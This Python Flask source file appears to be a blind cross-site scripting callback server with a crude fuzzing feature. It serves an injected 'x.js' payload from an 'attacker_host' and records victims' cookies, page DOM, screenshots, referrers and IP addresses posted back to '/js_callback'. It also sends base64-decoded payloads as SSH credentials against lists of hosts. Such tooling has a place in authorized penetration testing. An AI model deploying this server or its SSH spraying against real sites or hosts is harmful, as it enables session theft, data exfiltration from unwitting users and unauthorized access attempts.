import sqlite3
import json
import base64
import paramiko
from uuid import uuid4
from flask import Flask, request, render_template, session, redirect, Response, jsonify, make_response

# Flask Application
app = Flask(__name__, static_url_path='', static_folder='web/static', template_folder='web/templates')   

# Routes & Backend Functionality
@app.route("/")
def login_form():
    try:
        if session['logged_in'] == True:
            return redirect('/dashboard')
    except Exception, e:
        try:
            if request.args.get('csrf_fail') == 'true':
                return render_template('login.html', csrf_fail=True)
            elif request.args.get('invalid_creds') == 'true':
                return render_template('login.html', invalid_creds=True)
            else:
                return render_template('login.html')
        except:
                return render_template('login.html')
    
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == 'POST':
        username = request.values.get('user')
        password = request.values.get('password')
        sqlite_connection = sqlite3.connect("sqlite.db")
        c = sqlite_connection.cursor()
        c.execute("SELECT * FROM fuzzer_users WHERE username = :username AND password = :password", {"username":username,"password":password})
        login_success = c.fetchall()
        c.close()
        if login_success != []:
            session['logged_in'] = True
            session['is_admin'] = login_success[0][3]
            session['username'] = login_success[0][1]
            session['uuid'] = login_success[0][4]
            session['csrf'] = str(uuid4())
            return redirect('/dashboard')
        else:
            return redirect('/?invalid_creds=true')
    else:
        return redirect('/')

@app.route("/dashboard")
def dashboard():
    try:
        if session['logged_in'] == True:
            xss_pingback_url = "http://localhost:5000/%s/x.js" % session['uuid']
            return render_template('dashboard.html', username=session['username'], pingback_url=xss_pingback_url, is_admin=session['is_admin'], csrf_token=session['csrf'])
    except:
        return redirect('/')

@app.route('/api/<path:data>/<path:pingback_id>/', methods=["GET"])
def api(data,pingback_id):
    try:
        if session['logged_in'] == True:
            if data == "payload_fires":
                if str(pingback_id) == "me" or str(pingback_id) == "me/":
                    sqlite_connection = sqlite3.connect("sqlite.db")
                    c = sqlite_connection.cursor()
                    c.execute("SELECT * FROM fuzzer_payloads WHERE injection_key = :uuid", {"uuid":session['uuid']})
                    payload_fires = c.fetchall()
                    c.close()
                    return jsonify({"payloads":payload_fires})
                else:
                    sqlite_connection = sqlite3.connect("sqlite.db")
                    c = sqlite_connection.cursor()
                    c.execute("SELECT * FROM fuzzer_payloads WHERE id = :id AND injection_key = :uuid", {'id':int(pingback_id), 'uuid':session['uuid']})
                    payload_fires = c.fetchall()
                    c.close()
                    return jsonify({"payloads":payload_fires})                
        else:
            return redirect('/')
    except:
        return redirect('/')


@app.route("/<path:user_id>/x.js")
def bXSS(user_id):
    attacker_host="http://localhost:5000"
    return Response(render_template('xss.js', attacker_host=attacker_host, uid=user_id), mimetype='text/javascript')

@app.route("/js_callback", methods=["POST"])
def page_callback():
    # payload_category INTEGER, uri text, cookies text, referrer text, user_agent text, browser_time text, probe_uid text, origin text, injection_key text, dom text, screenshot text
    callback_data = json.loads(request.data)
    callback_data.update({"ip_address":request.remote_addr})
    callback_data = json.dumps(callback_data)
    sqlite_connection = sqlite3.connect("sqlite.db")
    c = sqlite_connection.cursor()
    c.execute("INSERT INTO fuzzer_payloads VALUES (:id, :payload_category, :injection_key, :b64json_array)", {'id': None, 'payload_category': 0, 'injection_key':json.loads(callback_data)['injection_key'], 'b64json_array':base64.b64encode(callback_data)})
    sqlite_connection.commit()
    sqlite_connection.close()
    return "success"

@app.route('/fuzz', methods=["GET", "POST"])
def fuzz():
    attack_data = json.loads(request.data)
    if attack_data["protocol"] == "ssh":
        for host in attack_data["hosts"].split(','):
            ssh_fuzz(host, base64.b64decode(attack_data["b64payload"]), base64.b64decode(attack_data["b64payload"]), int(attack_data["port"]))
    elif attack_data["protocol"] == "smb":
        print "SMB Fuzz"
    elif attack_data["protocol"] == "rdp":
        print "RDP Fuzz"
    return "Fuzzing..."

@app.route('/logout')
def logout():
    if session['csrf'] == request.args.get('csrf'):
        session.clear()
    return redirect('/')

def ssh_fuzz(host, username, password, port):
    ssh = paramiko.SSHClient()
    try:
        ssh.connect(host, username=username, password=password, port=port)
    except:
        pass
if __name__ == '__main__':
    try:
        sqlite_connection = sqlite3.connect("sqlite.db")
        c = sqlite_connection.cursor()
        c.execute("SELECT * FROM secret_key")
        key = c.fetchall()[0][0]
        c.close()
        app.secret_key = key
        app.run(host= '127.0.0.1', port=5000, debug=True)
    except Exception, e:
        print str(e)
